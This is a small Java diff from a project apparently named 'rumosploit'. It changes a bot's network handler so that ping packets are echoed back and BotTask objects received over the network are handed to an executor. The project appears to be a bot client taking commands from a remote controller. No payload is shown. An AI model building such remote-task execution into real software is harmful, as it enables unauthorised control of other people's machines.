@@ -6,8 +6,10 @@ import org.apache.mina.core.session.IoSession;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
+import com.github.rumoel.rumosploit.bot.Executor;
 import com.github.rumoel.rumosploit.bot.header.Header;
 import com.github.rumoel.rumosploit.bot.network.packet.PingPacket;
+import com.github.rumoel.rumosploit.tasks.BotTask;
 
 public class HandlerBot extends IoHandlerAdapter {
 	Logger logger = LoggerFactory.getLogger(getClass());
@@ -15,7 +17,12 @@ public class HandlerBot extends IoHandlerAdapter {
 	@Override
 	public void messageReceived(IoSession session, Object message) throws Exception {
 		if (message instanceof PingPacket) {
-			session.write(new PingPacket());
+			session.write(message);
+			return;
+		}
+		if (message instanceof BotTask) {
+			BotTask task = (BotTask) message;
+			Executor.executeTask(task);
 			return;
 		}
 		logger.info("{}", message);
